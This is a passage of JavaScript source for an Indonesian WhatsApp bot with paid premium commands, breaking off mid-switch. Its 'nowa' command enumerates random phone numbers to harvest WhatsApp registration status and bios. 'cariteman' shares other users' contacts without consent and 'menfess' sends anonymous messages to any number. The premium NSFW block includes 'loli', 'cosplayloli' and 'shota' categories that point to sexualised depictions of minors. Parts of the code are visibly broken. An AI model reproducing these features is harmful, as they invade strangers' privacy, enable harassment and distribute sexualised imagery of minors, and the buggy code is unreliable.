╭─❒ 「  *𝘉𝘶𝘺 𝘗𝘳𝘦𝘮* 」
│ Harga!
├ Pengguna baru Rp. 10k 
├>Masa aktif 2 Bulan
├ Pengguna baru Rp. 25k
├>Masa aktif 5 Bulan
╰─────────⁛⸙

╭─❒ 「  *𝘍𝘪𝘵𝘶𝘳 𝘗𝘳𝘦𝘮* 」
├ Limit tanpa batas 
├ Klaim lebih banyak EXP Harian
├ Fitur premium terbuka
├ Nsfw terbuka🗿
├ Bisa mengubah watermark stiker 
├ Dan masih banyak lagi 
╰─────────⁛⸙

𝗡𝗢𝗧𝗘 : 

Kegunaannya untuk Fitur Premium
Limit tanpa batas (Unlimited) .

jika minat chat owner dengan cara ketik .owner`

reply (`${teksny}`)
}
break
    
   case 'tutorqr':
reply(`*Pembayaran via QRIS*

1. Masuk ke aplikasi dompet digital Anda yang telah mendukung QRIS
2. Pindai/Scan QR Code yang tersedia
3. Akan muncul detail transaksi. Pastikan data transaksi sudah sesuai
4. Selesaikan proses pembayaran Anda
5. Transaksi selesai. Simpan bukti pembayaran Anda
`)                  
break

    
    
case 'zippy':
	case 'zippyshare':
	let { extract } = require( 'zs-extract')
	let { lookup } =  require( 'mime-types')
	  if (!args[0]) return setReply(`Masukkan URL zippyshare yang ingin didownload.\n\nContoh: ${prefix + command} https://www83.zippyshare.com/v/wD7mX1i0/file.html`)
	  if (!args[0].includes('zippyshare.com')) return setReppy( 'Invalid URL!\nPastikan URL merupakan URL zippyshare.')
	  setReply(mess.wait)
	  for (let i = 0; i < args.length; i++) {
		if (!args[i].includes('zippyshare.com/v')) continue
		let res = await extract(args[i])
		let mimetype = await lookup(res.download)
		conn.sendMessage(m.chat, { document: { url: res.download }, fileName: res.filename, mimetype }, { quoted: m })
	  }
	break


case 'ffstalk':{
  try{
if (!q) return setReply (`Contoh ${prefix + command} 530793139`);
var epep = await ffstalk(q)
setReply (`*/ Stalking Free Fire \*

• *Id*: ${epep.id}
• *Nama*: ${epep.nickname}`)
} catch (e){
    setReply ('Id tidak di temukan')
}
}
break
  
case 'mlstalk':
        { 
try{       
          if (!q) return setReply (`Contoh ${prefix + command} 530793138|8129`);
          let dat = await mlstalk(q.split('|')[0], q.split('|')[1]);
          setReply (`*/ Stalking Mobile Legengds \\*

*Nama*: ${dat.userName}
*Id*: ${q.split('|')[0]}
*Zoneid*: ${q.split('|')[1]}`);
        } catch (e){
    setReply ('Id tidak di temukan')
}
        }
        break;
                           
    case 'anticolong':{
	var stiker = false
	try {
		let [packname, ...author] = q.split('|')
		let mime = m.quoted.mimetype || ''
		if (!/webp/.test(mime)) throw 'Reply sticker!'
    let img = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
		if (!img) throw 'Reply a sticker!'
		var stiker = await addExifAvatar(img, packName || '', authorName || '')
	} catch (e) {
		console.error(e)
		if (Buffer.isBuffer(e)) stiker = e
	} finally {
		if (stiker) conn.sendMessage(m.chat, { sticker: stiker }, { quoted: dev })
		else throw 'Conversion failed'
	}
}

break

    
case 'nowa':{
                   if (args.length < 1) return setReply (`Kirim perintah ${command} nomer`)
                   var teks = args[1]
                   if (!q.includes('x')) return setReply ('lah?')
                   reply(mess.wait)
                   function countInstances(string, word) {
                     return string.split(word).length - 1;
                   }
                   var nomer0 = q.split('x')[0]
                   var nomer1 = q.split('x')[countInstances(q, 'x')] ? teks.split('x')[countInstances(teks, 'x')] : ''
                   var random_length = countInstances(q, 'x')

                   var random;
                   if (random_length == 1) {
                     random = 10
                   } else if (random_length == 2) {
                     random = 100
                   } else if (random_length == 3) {
                     random = 1000
                   }

                   var nomerny = `List Nomer\n\nPunya Bio/status/info\n`
                   var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
                   var no_watsap = `\nTidak Terdaftar\n`

                   for (let i = 0; i < random; i++) {
                     var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
                     var dom1 = nu[Math.floor(Math.random() * nu.length)]
                     var dom2 = nu[Math.floor(Math.random() * nu.length)]
                     var dom3 = nu[Math.floor(Math.random() * nu.length)]
                     var dom4 = nu[Math.floor(Math.random() * nu.length)]

                     var rndm;
                     if (random_length == 1) {
                       rndm = `${dom1}`
                     } else if (random_length == 2) {
                       rndm = `${dom1}${dom2}`
                     } else if (random_length == 3) {
                       rndm = `${dom1}${dom2}${dom3}`
                     } else if (random_length == 4) {
                       rndm = `${dom1}${dom2}${dom3}${dom4}`
                     }

                     var anu = await conn.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
                     var anuu = anu.length !== 0 ? anu : false

                     try {
                       try {
                         var anu1 = await conn.fetchStatus(anu[0].jid)
                       } catch {
                         var anu1 = '401'
                       }
                       if (anu1 == '401' || anu1.status.length == 0) {
                         no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                         //console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
                       } else {
                         nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBio Name : ${anu1.status}\nTahun : ${moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')}\n\n`
                         //console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
                       }
                     } catch {
                       no_watsap += `${nomer0}${i}${nomer1}\n`
                       //console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [NOT REGISTERED]`, 'red'))
                     }
                   }
                   reply(`${nomerny}${no_bio}${no_watsap}`)
                   }
                   break

    
 case 'gdrive': {
const { sizeFormatter } = await import( 'human-readable')
let formatSize = sizeFormatter({
std: 'JEDEC', decimalPlaces: 2, keepTrailingZeroes: false, render: (literal, symbol) => `${literal} ${symbol}B`
})

async function GDriveDl(url) {
let id
if (!(url && url.match(/drive\.google/i))) return setReply( 'Invalid URL')
id = (url.match(/\/?id=(.+)/i) || url.match(/\/d\/(.*?)\//))[1]
if (!id) return setReply( 'ID Not Found')
let res = await fetch(`https://drive.google.com/uc?id=${id}&authuser=0&export=download`, {
method: 'post',
headers: {
'accept-encoding': 'gzip, deflate, br',
'content-length': 0,
'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
'origin': 'https://drive.google.com',
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
'x-client-data': 'CKG1yQEIkbbJAQiitskBCMS2yQEIqZ3KAQioo8oBGLeYygE=',
'x-drive-first-party': 'DriveWebUi',
'x-json-requested': 'true'
}
})
let { fileName, sizeBytes, downloadUrl } =  JSON.parse((await res.text()).slice(4))
if (!downloadUrl) return setReply( 'Link Download Limit!')
let data = await fetch(downloadUrl)
if (data.status !== 200) throw data.statusText
return { downloadUrl, fileName, fileSize: formatSize(sizeBytes), mimetype: data.headers.get('content-type') }
}

if (!q) return setReply( 'Input URL' )
GDriveDl(args[0]).then(async (res) => {
if (!res) throw res
await m.reply(JSON.stringify(res, null, 2))
conn.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: dev })
})
}
break


    
case 'qc':{
	if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
	try{
const sender = (dev.quoted?.text ? dev.quoted : dev).sender
const name = await conn.getName(sender)
let teks = m.quoted ? m.quoted.text : q ? q : ""
const avatar = await conn.profilePictureUrl(sender, "image").catch(_ => "https://telegra.ph/file/89c1638d9620584e6e140.png")

if(isImage || isQuotedImage || isQuotedSticker){  
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let anu = await uploadFile(media)
const json = { type: "quote", format: "png", backgroundColor: "#FFFFFF", width: 512, height: 768,  scale: 2, messages: [{ entities: [], media: { url: anu }, avatar: true, from: { id: 1, name, photo: { url: avatar }}, text: `${teks}`, replyMessage: {} }]}
 const { data } = await axios.post("https://bot.lyo.su/quote/generate", json, {
    headers: {
      "Content-Type": "application/json"
    }
  }).catch(e => e.response || {})
 if(!data.ok) throw data
const buffer = Buffer.from(data.result.image, "base64")
makeSticker(buffer,Sticker, StickerTypes)
} else {
const json = { type: "quote", format: "png", backgroundColor: "#FFFFFF", width: 512, height: 768,  scale: 2, messages: [{ entities: [], avatar: true, from: { id: 1, name, photo: { url: avatar }}, text: `${teks}`, replyMessage: {} }]}
const { data } = await axios.post("https://bot.lyo.su/quote/generate", json, {
    headers: {
      "Content-Type": "application/json"
    }
  }).catch(e => e.response || {})
  if(!data.ok) reply( data)
const buffer = Buffer.from(data.result.image, "base64")
makeSticker(buffer,Sticker, StickerTypes)
}
} catch (e){
    console.log(e)
   // reply (`${e}`)
	setReply ('System erorr coba lgi')
	return
	}
}
db.data.users[sender].limit -= 1 // -1 limit
break
    

    
case 'addkick':{
	try{
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
if (!isGroup) return setReply(mess.only.group)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
let grup = db.data.kickon[from]
let number = Input
if(grup){
if(grup.includes(number)) return setReply("Target sudah ada di database")
grup.push(number)
setReply(`Berhasil memasukan ${number} ke dalam target kick`)
} else {
db.data.kickon[from] = []
grup.push(number)
let teks =`Berhasil memasukan ${number} ke dalam target kick
dan telah menandai user sebagai user biadap`
setReply(teks)
}
} catch (e){
	reply(`Salah!!\nContoh: ${prefix+command} @tagnomornya/Input nomornya`)
	}
}
break 
    
case 'delkick':{
	try{
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
if (!isGroup) return setReply(mess.only.group)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
let grup = db.data.kickon[from]
if(!grup) return setReply("Gunakan fitur addkick terlebih dahulu")
let number = Input
grup.splice(grup.indexOf(number,1))
setReply("Berhasil menghapus user dari target kick")
} catch (e){
	reply(`Salah!!\nContoh: ${prefix+command} @tagnomornya/Input nomornya`)
	}
}
break

case 'listkick':{
let kick = db.data.kickon[from]
if(!kick) return setReply("Group ini tidak memiliki listkick")
let banya = `*List Kick*\nJumlah : ${kick.length}\n\n`
kick.map(function(e, i){
banya +=(i+1)+`. Nomer : wa.me/${e}\n\n`            
});
setReply(banya)
}
break    
    
    
             case 'secreto': case 'confes':
                case 'menfess': case 'menfes': {
                   if (isGroup) return setReply('Khsus Private Chat Bot')
                   if (args.length < 1) return setReply (`*Cara penggunaan :*\n${prefix+command} nomer|nama pengirim|pesannya\n\n*Note :* nomer harus format internasional dan nama pengirim boleh nama samaran atau rahasia\n\n*Contoh :* ${prefix+command} ${botNumber.split("@")[0]}|Seseorang|Hai Kak`)
                   var num = q.split('|')[0];
                   var name = q.split('|')[1]; 
                   var pesan = q.split('|')[2];
                   if (isNaN(num)) return setReply (`Tujuan Harus Berupa Nomor!\n\nContoh :\n${command} `+botNumber.split("@")[0]+'|Anonim|Hai Kak')
                   if (!num) return setReply (`Format salah, contoh pemakaian : ${prefix+command} ${botNumber.split("@")[0]}|Anonim|Hai Kak`)
                   if (!name) return setReply (`Format salah, contoh pemakaian : ${prefix+command} ${botNumber.split("@")[0]}|Anonim|Hai Kak`)
                   if (!pesan) return setReply (`Format salah, contoh pemakaian : ${prefix+command} ${botNumber.split("@")[0]}|Anonim|Hai Kak`)
                  var num = num.replace(/[^0-9]/gi, '')+'@s.whatsapp.net'
                   var cek = await conn.onWhatsApp(num)
                   if (cek.length === 0) return setReply (`Nomer yang anda masukkan tidak terdaftar di WhatsApp!`)
                   var num = cek[0].jid
                   if (sender === num) return setReply (`Jangan kirim ke diri sendiri dong🥲`)
                   if (botNumber === num) return setReply (`Jangan kirim ke nomer bot kak🥲`)
                   var teks = `Hi Saya *${botName}* Ada Yang Kirim Pesan Rahasia Untuk Kamu Nih 🥳

🌷 Nama Pengirim: *${name}*

💌 Pesan : ${pesan}


*NOTE*:
_Ketik .balas dan geser ke kanan pesan ini untuk menjawab pesan seseorang tersebut_
`          
                   conn.sendMessage(num, {text: teks, mentions: [sender]})
                   conn.sendMessage(num, {image: {url: 'https://telegra.ph/file/15b96750f11c403727c6e.jpg'}, caption: 'Contoh cara membalas pesan rahasia'})
                   reply(`Sukses mengirim pesan Rahasia kepada ${num.split("@")[0]}`)
                   }
                   break



    
                case 'balas':{
                    if(isGroup) return
                    if(!mentionByReply) return reply('Balas pesan bot yang isinya menfess di atas')
                    if(!dev.quoted.text.includes('Hi Saya')) return reply('Balas/Reply pesan bot yang isi menfes di atas')
                    var isSecreto = secreto.find(i => i.sender === sender)
                    if (isSecreto) {
                     if (isSecreto.status === 'ENTER-MESSAGE') {
                       reply(`Mau dibalas apa kak? Silahkan kirim pesan balasannya`)
                     }
                   } else {
                     var obj = {
                       sender: sender,
                       pengirim: m.quoted.mentionedJid[0],
                       status: 'ENTER-MESSAGE'
                     }
                     //console.log(obj)
                     secreto.push(obj)
                     fs.writeFileSync('./database/secreto_balas.json', JSON.stringify(secreto))
                     reply(`Mau dibalas apa kak? Silahkan kirim pesan balasannya`)
                   }
                   }
                   break   
    

case 'autosimi':{
  if(!isGroup) return setReply (mess.group)
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
					if (args[0] === 'on') {
						if (isSimi) return setReply ('Sudah Aktif Kak')
						siminya.push(from)
						fs.writeFileSync('./database/simi.json', JSON.stringify(siminya))
						setReply ('Sukses mengaktifkan simi')
					} else if (args[0] === 'off') {
						if (!isSimi) return setReply ('Sudah Mati Kak')
						var ini = siminya.indexOf(from)
						siminya.splice(ini, 1)
						fs.writeFileSync('./database/simi.json', JSON.stringify(siminya))
						setReply ('Sukses menonaktifkan simi')
					 }else if (!q) {
          reply(`*AUTO SIMI*\n\n${prefix + command} on\n${prefix+command}off`)
   }
   }
       break;
   
 
case 'caridoi':
case 'cariteman':{
let userny = Object.values(db.data.users);
let teman = pickRandom(userny)
let namTemen = teman.name
let nomerTemen = teman.id
setTimeout(() => {
setReply('Sedang mencari....')
}, 1000)
setTimeout(() => {
setReply('Berhasil mendapatkan satu org')
}, 5000)
setTimeout(() => {
conn.sendContact(from, nomerTemen, namTemen, m)
}, 9000)
}
break

    
    
case 'ig': 
case 'instagram':{
  try{
if (!q) return setReply (`Linknya?\nContoh: ${prefix + command} https://www.instagram.com/p/CKXZ1Z1JZK/`)
setReply (mess.wait)
let res = await fetchJson (`https://xzn.wtf/api/igdl?url=${q}&apikey=${apiwtf}`)
for (let i of res.media) {
await sleep (2000)
conn.sendFile(from, i,'ig.mp4', `*INSTAGRAM DOWNLOADER*\n\n${res.caption}`, m)
}   
} catch (e) {
let res = await instagram3 (q)
    for (let i of res) {
await sleep (2000)
conn.sendFile(from, i)
    }
  }
}
break

    
  case 'delsesi': 
  case 'clearsession': {
fs.readdir("./session", async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return setReply('Unable to scan directory: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
   )
console.log(filteredArray.length); 
let teks =`Terdeteksi ${filteredArray.length} file sampah\n\n`
if(filteredArray.length == 0) return setReply(teks)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
setReply(teks) 
await sleep(2000)
setReply("Menghapus file sampah...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
setReply("Berhasil menghapus semua sampah di folder session")     
});
}
break
    

   case 'nulis':{  
   	if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
if (args.length < 1) return setReply(`Penggunaan ${prefix + command} nama|kelas|nomor urut|teksnya\nContoh: ${prefix + command} alice|12 IPS 4|5|Tugas\n1. apa yang di maksud dengan nodejs`)
let nama = q.split("|")[0]
if (!nama) return m.reply('Nama mu siapa kak ')
let kelas = q.split("|")[1];
if (!kelas) return m.reply('Kelas mana kak')
let nourut = q.split("|")[2];
if (!nourut) return m.reply('nomor urut mana kak')
let tekss = q.split("|")[3];
if (!tekss) return m.reply('soalnya mana mana kak')
let urll = `https://oni-chan.my.id/api/Fmake/nulis?nama=${nama}&kelas=${kelas}&no=${nourut}&text=${tekss}&apikey=istighfar`
conn.sendMessage(from, {caption: 'Nih jangan mager nulis', image: {url: urll}}, {quoted: dev})
}
db.data.users[sender].limit -= 1 // -1 limit
break

 
    
case 'status':
                case 'statistik': {            
                   var nodeos = require('node-os-utils')
                  const getFolderSize = (await import("get-folder-size")).default;
                   var { totalGb, usedGb, freeGb } = await nodeos.drive.info()
                   //var { download, upload } = await checkBandwidth()                  
                   var allgrup = await conn.groupFetchAllParticipating().then(res => Object.values(res))
                   var allchat = await store.chats.all() 
                  let listpc = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                   let storage = await getFolderSize.loose('.');
	               let moduls = await getFolderSize.loose('./node_modules');
	               let session = await getFolderSize.loose('./session')
	               let databse = await getFolderSize.strict('./database/database.json');
                   var stat = `*STATISTIK BOT*

*Speed :* ${latensi.toFixed(4)} Second
*Runtime :* ${runtime(process.uptime())}
*Total Chat :* ${allchat.length}
*Private Chat :* ${listpc.length}
*Group Chat :* ${allgrup.length}

*Storage*
	*Internal* : ${FileSize(storage)}
	*Modules* : ${FileSize(moduls)}
	*Session* : ${FileSize(session)}
	*Database* : ${FileSize(databse)}
	*Used :* ${usedGb} GB
    *Free :* ${freeGb} GB
`
                   reply(stat)
                   }
                   break

    

    case 'aesthetic':
      case 'ahegao':
      case 'akira':
      case 'akiyama':
       case 'ana':
      case 'anjing':
      case 'art':
      case 'ass':
      case 'asuna':
      case 'ayuzawa':
      case 'bdsm':
      case 'boneka':
      case 'boruto':
      case 'bts':
      case 'cecan':
      case 'chiho':
      case 'chitoge':
      case 'cogan':
      case 'cosplay':
      case 'cosplayloli':
      case 'cosplaysagiri':
      case 'cuckold':
      case 'cum':
      case 'cyber':
      case 'darkjokes':
      case 'deidara':
      case 'doraemon':
      case 'eba':
      case 'elaina':
      case 'emilia':
      case 'ero':
      case 'erza':
      case 'exo':
      case 'femdom':
      case 'foot':
      case 'freefire':
      case 'gamewallpaper':
      case 'gangbang':
      case 'gifs':
      case 'glasses':
      case 'gremory':
      case 'hekel':
      case 'hentai':
      case 'hestia':
      case 'hijaber':
      case 'hinata':
       case 'husbu':
       case 'inori':
      case 'islamic':
      case 'isuzu':
      case 'itachi':
      case 'itori':
      case 'jahy':
      case 'jeni':
      case 'jiso':
      case 'justina':
      case 'kaga':
      case 'kagura':
      case 'kakasih':
      case 'kaori':
      case 'kartun':
      case 'katakata':
      case 'keneki':
      case 'kotori':
      case 'kpop':
      case 'kucing':
      case 'kurumi':
      case 'lisa':
       case 'loli':
      case 'madara':
      case 'masturbation':
      case 'megumin':
      case 'mikasa':
      case 'mikey':
      case 'miku':
      case 'milf':
      case 'minato':
      case 'mobil':
      case 'motor':
      case 'mountain':
      case 'naruto':
       case 'neko':
       case 'neko2':
      case 'nekonime':
      case 'nezuko':
      case 'onepiece':
      case 'orgy':
      case 'panties':
      case 'pentol':
      case 'pokemon':
     // case 'profil':
      case 'programming':
      case 'pubg':
      case 'pussy':
      case 'randblackpink':
      case 'randomnime':
      case 'randomnime2':
      case 'rize':
      case 'rose':
      case 'ryujin':
      case 'sagiri':
      case 'sakura':
      case 'sasuke':
      case 'satanic':
      case 'shina':
      case 'shinka':
      case 'shinomiya':
      case 'shizuka':
      case 'shota':
      case 'tatasurya':
      case 'technology':
      case 'tejina':
      case 'tentacles':
      case 'thighs':
      case 'toukachan':
      case 'tsunade':
       case 'waifu':
      case 'wallhp':
      case 'wallml':
      case 'wallnime':
      case 'yotsuba':
      case 'yuki':
      case 'yulibocil':
      case 'yumeko':
        {
        	if (!isPremium && global.db.data.users[sender].limit < 1) return reply(mess.limit) // respon ketika limit habis
          let heyy;
          if (/aesthetic/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/aesthetic.json'
            );
          if (/ahegao/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/ahegao.json'
            );
          if (/akira/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/akira.json'
            );
          if (/akiyama/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/akiyama.json'
            );
          if (/ana/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/ana.json'
            );
          if (/anjing/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/anjing.json'
            );
          if (/art/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/art.json'
            );
          if (/ass/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/ass.json'
            );
          if (/asuna/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/asuna.json'
            );
          if (/ayuzawa/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/ayuzawa.json'
            );
          if (/bdsm/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/bdsm.json'
            );
          if (/boneka/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/boneka.json'
            );
          if (/boruto/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/boruto.json'
            );
          if (/bts/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/bts.json'
            );
          if (/cecan/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/cecan.json'
            );
          if (/chiho/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/chiho.json'
            );
          if (/chitoge/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/chitoge.json'
            );
          if (/cogan/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/cogan.json'
            );
          if (/cosplay/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/cosplay.json'
            );
          if (/cosplayloli/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/cosplayloli.json'
            );
          if (/cosplaysagiri/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/cosplaysagiri.json'
            );
          if (/cuckold/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/cuckold.json'
            );
          if (/cum/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/cum.json'
            );
          if (/cyber/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/cyber.json'
            );
          if (/darkjokes/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/darkjokes.json'
            );
          if (/deidara/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/deidara.json'
            );
          if (/doraemon/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/doraemon.json'
            );
          if (/eba/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/eba.json'
            );
          if (/elaina/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/elaina.json'
            );
          if (/emilia/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/emilia.json'
            );
          if (/ero/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/ero.json'
            );
          if (/erza/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/erza.json'
            );
          if (/exo/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/exo.json'
            );
          if (/femdom/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/femdom.json'
            );
          if (/foot/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/foot.json'
            );
          if (/freefire/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/freefire.json'
            );
          if (/gamewallpaper/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/gamewallpaper.json'
            );
          if (/gangbang/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/gangbang.json'
            );
          if (/gifs/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/gifs.json'
            );
          if (/glasses/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/glasses.json'
            );
          if (/gremory/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/gremory.json'
            );
          if (/hekel/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/hekel.json'
            );
          if (/hentai/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/hentai.json'
            );
          if (/hestia/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/hestia.json'
            );
          if (/hijaber/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/hijaber.json'
            );
          if (/hinata/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/hinata.json'
            );
          if (/husbu/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/husbu.json'
            );
          if (/inori/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/inori.json'
            );
          if (/islamic/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/islamic.json'
            );
          if (/isuzu/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/isuzu.json'
            );
          if (/itachi/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/itachi.json'
            );
          if (/itori/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/itori.json'
            );
          if (/jahy/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/jahy.json'
            );
          if (/jeni/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/jeni.json'
            );
          if (/jiso/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/jiso.json'
            );
          if (/justina/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/justina.json'
            );
          if (/kaga/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/kaga.json'
            );
          if (/kagura/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/kagura.json'
            );
          if (/kakasih/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/kakasih.json'
            );
          if (/kaori/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/kaori.json'
            );
          if (/kartun/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/kartun.json'
            );
          if (/katakata/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/katakata.json'
            );
          if (/keneki/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/keneki.json'
            );
          if (/kotori/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/kotori.json'
            );
          if (/kpop/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/kpop.json'
            );
          if (/kucing/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/kucing.json'
            );
          if (/kurumi/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/kurumi.json'
            );
          if (/lisa/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/lisa.json'
            );
          if (/loli/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/loli.json'
            );
          if (/madara/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/madara.json'
            );
          if (/masturbation/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/masturbation.json'
            );
          if (/megumin/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/megumin.json'
            );
          if (/mikasa/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/mikasa.json'
            );
          if (/mikey/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/mikey.json'
            );
          if (/miku/.test(command))
